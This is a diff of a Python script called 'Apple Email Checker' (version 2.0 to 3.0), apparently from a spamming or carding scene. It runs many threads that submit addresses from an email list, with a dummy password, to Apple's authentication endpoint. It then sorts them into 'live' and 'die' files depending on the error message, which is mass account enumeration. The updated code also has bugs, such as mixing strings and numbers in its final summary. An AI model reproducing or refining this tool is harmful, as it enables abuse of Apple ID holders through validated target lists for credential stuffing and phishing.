@@ -1,107 +1,106 @@
 import requests
-import re
 import time
 import threading
-import sys
 import queue
-import sys
-import datetime
+from datetime import datetime
+
 
 class Apple():
+    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
+    die = 'Your Apple ID or password was entered incorrectly.'.encode()
+    inputQueue = queue.Queue()
 
-	ua 			= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'
-	live 		= 'Access denied. Your account does not have permission to access this application.'.encode()
-	die 		= 'Your Apple ID or password was entered incorrectly.'.encode()
-	version 	= 'Apple Email Checker 2.0' 
-	input_queue = queue.Queue()
-	
+    def __init__(self):
 
-	def __init__(self):
-
-		print(r"""
-     _                _      _____ __  __       _ _  ____ _               _                     ____    ___  
-    / \   _ __  _ __ | | ___| ____|  \/  | __ _(_) |/ ___| |__   ___  ___| | _____ _ __  __   _|___ \  / _ \ 
-   / _ \ | '_ \| '_ \| |/ _ \  _| | |\/| |/ _` | | | |   | '_ \ / _ \/ __| |/ / _ \ '__| \ \ / / __) || | | |
-  / ___ \| |_) | |_) | |  __/ |___| |  | | (_| | | | |___| | | |  __/ (__|   <  __/ |     \ V / / __/ | |_| |
- /_/   \_\ .__/| .__/|_|\___|_____|_|  |_|\__,_|_|_|\____|_| |_|\___|\___|_|\_\___|_|      \_/ |_____(_)___/ 
-         |_|   |_|                                                                                           
+        print(r"""
+ ,_,
+(O,O)	Apple Email Checker - 3.0
+(   )	mukhlis@slackerc0de.us
+-"-"--
 		""")
 
-		self.mailist = input(" -> Enter Mailist : ")
-		self.thread = input(" -> Thread : ")
-		self.count_list = len(list(open(self.mailist)))
-		self.clean = input(" -> Clean rezult folder ? (y/n) ")
-		if self.clean == 'y' : self.clean_rezult()
-		print('')
+        self.mailist = input("Mailing list file names ? ")
+        self.thread = input("How many threads ? ")
+        self.countList = len(list(open(self.mailist)))
+        self.clean = input("Clean rezult folder ? (y/n) ")
+        if self.clean == 'y':
+            self.clean_rezult()
+        print('')
 
-	def save_to_file(self,nameFile,x):
-		kl = open(nameFile, 'a+')
-		kl.write(x)
-		kl.close()
+    def save_to_file(self, nameFile, x):
+        kl = open(nameFile, 'a+')
+        kl.write(x)
+        kl.close()
 
-	def clean_rezult(self):
-		open('rezult/live.txt', 'w').close()
-		open('rezult/die.txt', 'w').close()
-		open('rezult/unknown.txt', 'w').close()
+    def clean_rezult(self):
+        open('rezult/live.txt', 'w').close()
+        open('rezult/die.txt', 'w').close()
+        open('rezult/unknown.txt', 'w').close()
 
-	def post_email(self,eml):
+    def post_email(self, eml):
+        try:
+            r = requests.post('https://idmsac.apple.com/authenticate',
+                              params={
+                                  'accountPassword': 'xxxxxx',
+                                  'appleId': eml,
+                                  'appIdKey': 'c991a1687d72e54d35d951a58cf7aa33fe722353b48f89d27c1ea2ffa08a4b80'
+                              },
+                              headers={'User-Agent': self.ua}
+                              )
+            if self.die in r.content:
+                return 'die'
+            else:
+                return 'live'
+        except:
+            return 'unknown'
 
-		r = requests.post('https://idmsac.apple.com/authenticate', 
-					params={
-						'accountPassword':'x',
-						'appleId':eml,
-						'appIdKey':'3b356c1bac5ad9735ad62f24d43414eb59715cc4d21b178835626ce0d2daa77d'
-						}, 
-					headers={'User-Agent': self.ua}
-				)
-		if self.live in r.content: return 'live'
-		elif self.die in r.content: return 'die'
-		else : return 'unknown'
+    def chk(self):
 
-	def chk(self):
+        while 1:
+            eml = self.inputQueue.get()
+            rez = self.post_email(eml)
+            time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 
-		while 1:
+            if rez == 'die':
+                print('[+] '+time+' - DIE - '+eml +
+                      ' - [Apple Email Checker - 3.0]')
+                self.save_to_file('rezult/die.txt', eml+'\n')
 
-			eml = self.input_queue.get()
-			rez = self.post_email(eml)
+            elif rez == 'live':
+                print('[+] '+time+' - LIVE - '+eml +
+                      ' - [Apple Email Checker - 3.0]')
+                self.save_to_file('rezult/live.txt', eml+'\n')
 
-			if rez == 'live': 
-				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- LIVE - '+eml)
-				self.save_to_file('rezult/live.txt',eml+'\n') 
-			elif rez == 'die':
-				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- DEAD - '+eml) 
-				self.save_to_file('rezult/die.txt',eml+'\n') 
-			elif rez == 'unknown': 
-				print(' ->',self.version,'-',datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),'- UNKN - '+eml)
-				self.save_to_file('rezult/unknown.txt',eml+'\n') 
+            elif rez == 'unknown':
+                print('[+] '+time+' - UNKNOWN - '+eml +
+                      ' - [Apple Email Checker - 3.0]')
+                self.save_to_file('rezult/unknown.txt', eml+'\n')
 
-			self.input_queue.task_done()
+            else:
+                print('contact coder')
 
-	def run_thread(self):	
+        self.inputQueue.task_done()
 
-		self.start_time = time.time()
+    def run_thread(self):
+        self.startTime = time.time()
+        for x in range(int(self.thread)):
+            t = threading.Thread(target=self.chk)
+            t.setDaemon(True)
+            t.start()
+        for y in open(self.mailist, 'r').readlines():
+            self.inputQueue.put(y.strip())
+        self.inputQueue.join()
 
-		for x in range(int(self.thread)):
-			t = threading.Thread(target=self.chk)
-			t.setDaemon(True)
-			t.start()
+    def finish(self):
+        print('')
+        print('Checking '+self.countList+' emails has been completed perfectly in ' +
+              time.time() - self.startTime+'seconds')
+        print('')
+        print('Live    : ', len(list(open('rezult/live.txt'))), 'emails')
+        print('Die     : ', len(list(open('rezult/die.txt'))), 'emails')
+        print('Unknown : ', len(list(open('rezult/unknown.txt'))), 'emails')
+        print('')
 
-		for y in open(self.mailist, 'r').readlines():
-			self.input_queue.put(y.strip())
-		self.input_queue.join()
-
-	def finish(self):
-		print('')
-		print('-------------------------------------------------')
-		print('')
-		print('Checking ',self.count_list,' emails has been completed perfectly')
-		print('Processing time : ',time.time() - self.start_time,'seconds')
-		print('')
-		print('Live : ',len(list(open('rezult/live.txt'))),'emails')
-		print('Die : ',len(list(open('rezult/die.txt'))),'emails')
-		print('Unknown : ',len(list(open('rezult/unknown.txt'))),'emails')
-		print('')
-		print('Bye :)')
 
 heh = Apple()
 heh.run_thread()
